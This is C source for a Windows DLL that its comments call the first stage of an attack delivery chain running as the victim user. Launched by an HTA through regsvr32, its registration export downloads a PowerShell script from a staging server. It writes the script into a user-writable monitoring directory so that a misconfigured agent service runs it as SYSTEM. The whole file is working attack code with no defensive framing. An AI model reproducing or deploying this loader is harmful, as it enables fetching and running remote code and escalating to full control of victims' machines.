// loader-regsvr32.c — first stage of the delivery chain, running as the victim user.
//
// The HTA loads this DLL with regsvr32. It stays inside what a standard user can do: no service, no
// scheduled task, no elevation.
//
//   1. fetch the agent script from the staging server
//   2. write it into the HealthMonitor checks directory, which Users can write to
//   3. the agent service picks it up within a minute and runs it as SYSTEM
//
// The chain depends on the agent misconfiguration, not on anything the loader creates with privileges.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdarg.h>

#pragma comment(lib, "wininet.lib")

#define AGENT_URL  "http://192.168.50.100/agent-update.ps1"
#define AGENT_DIR  "C:\\ProgramData\\HealthMonitor\\checks"
#define AGENT_PATH "C:\\ProgramData\\HealthMonitor\\checks\\update.ps1"
#define LOG_PATH   "C:\\ProgramData\\HealthMonitor\\checks\\loader.log"

static void Log(const char *fmt, ...)
{
    FILE *f;
    va_list ap;
    f = fopen(LOG_PATH, "a");
    if (!f) return;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static BOOL Download(const char *url, const char *path)
{
    HINTERNET net, req;
    HANDLE out;
    BYTE buf[16384];
    DWORD got, written;
    BOOL ok = TRUE;

    net = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!net) return FALSE;
    req = InternetOpenUrlA(net, url, NULL, 0,
                           INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!req) { InternetCloseHandle(net); return FALSE; }

    out = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) { InternetCloseHandle(req); InternetCloseHandle(net); return FALSE; }

    for (;;) {
        if (!InternetReadFile(req, buf, sizeof(buf), &got)) { ok = FALSE; break; }
        if (got == 0) break;
        if (!WriteFile(out, buf, got, &written, NULL) || written != got) { ok = FALSE; break; }
    }
    CloseHandle(out);
    InternetCloseHandle(req);
    InternetCloseHandle(net);
    Log("download %s -> %s : %s", url, path, ok ? "ok" : "failed");
    return ok;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved)
{
    (void)h; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) Log("loader attached");
    return TRUE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)
{
    Log("=== loader start ===");
    CreateDirectoryA(AGENT_DIR, NULL);
    if (Download(AGENT_URL, AGENT_PATH)) {
        Log("agent script staged in %s", AGENT_DIR);
    } else {
        Log("agent script download failed");
    }
    Log("=== loader done ===");
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void)
{
    return S_OK;
}
